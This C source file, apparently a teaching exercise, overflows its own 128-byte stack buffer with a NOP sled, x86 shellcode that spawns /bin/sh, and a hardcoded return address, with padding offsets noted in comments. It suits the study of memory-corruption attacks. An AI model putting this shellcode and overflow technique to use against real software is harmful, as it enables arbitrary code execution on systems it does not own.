#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// NOP:
// \x90

// Shellcode (28 bytes):
// \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80


// Return address: 6 bytes
// "\xc8\xdd\xff\xff\xff\xff"


// $(python3 -c "print('A'*140)")


// The good n is 124


int func(int n) {

	printf("\n");
	printf("Hello there !\n\n");

	// The attacked buffer
	char buf[128];
	
	// The attacking buffer
	char abuf[256];
	memset(abuf, 0, 256);
	
	// The NOP-slide
	for (int k = 0; k < n; k++) {
		abuf[k] = '\x90';
	}
	
	// The payload
	strcat(abuf, "\xcc\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80");
	
	// The return address
	strcat(abuf, "\xc8\xdd\xff\xff\xff\xff");
	
	/*
	printf("\nabuf: %s\n\n", abuf);
	printf("abuf length: %d\n\n", strlen(abuf));
	*/
	
	printf("General Kenobi !\n\n");
	
	strcpy(buf, abuf);
	
	/*
	printf("\nbuf: %s\n\n", buf);
	char *ptr = buf;
	for (int k = 0; k < 100; k++) {
		printf("%d: %x\n", k, *(ptr + k));
	}
	*/
	
	return 0;

}

int main(int argc, char* argv[]) {
	
	// The size of the NOP-slide
	int n = atoi(argv[1]);

	func(n);
	
	return 0;
	
}
